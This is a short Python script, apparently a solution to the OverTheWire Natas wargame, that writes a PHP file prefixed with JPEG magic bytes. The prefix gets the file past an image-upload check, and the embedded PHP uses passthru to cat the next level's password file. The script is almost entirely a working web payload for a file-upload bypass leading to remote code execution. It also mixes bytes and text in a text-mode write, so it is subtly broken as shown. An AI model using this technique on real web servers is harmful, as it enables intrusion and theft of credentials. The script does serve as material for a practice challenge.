'''
This is a script written for natas13 from http://overthewire.org/wargames/natas/natas14.html
All that this script does is writes a JPEG signature to the gimme-bypass.php file so that
when this file is uploaded to the web server, its code will detect the .php gile as a JPEG
file. This allows for remote code execution, so I just simply cat the contents of the 
password file using the gimme-bypass.php script.
'''

filey = open('gimme-bypass.php', 'w')
filey.write(b'\xFF\xD8\xFF\xFF\xD9' + '<? passthru("cat /etc/natas_webpass/natas14"); ?>\n')
filey.close()
